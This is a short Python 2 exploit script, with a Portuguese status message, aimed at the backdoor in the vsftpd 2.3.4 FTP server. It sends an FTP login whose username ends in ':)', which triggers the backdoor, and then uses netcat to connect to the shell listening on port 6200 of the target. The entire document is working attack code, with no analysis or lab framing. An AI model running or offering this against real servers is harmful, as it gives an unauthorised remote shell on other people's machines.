#!/usr/bin/python
import socket, os, sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],21))
r = s.recv(1024)
s.send("USER matheus:)\r\n")
s.send("PASS xxxx\r\n")
print "Explorando o serviço"
os.system("nc -nv "+sys.argv[1]+ " 6200")
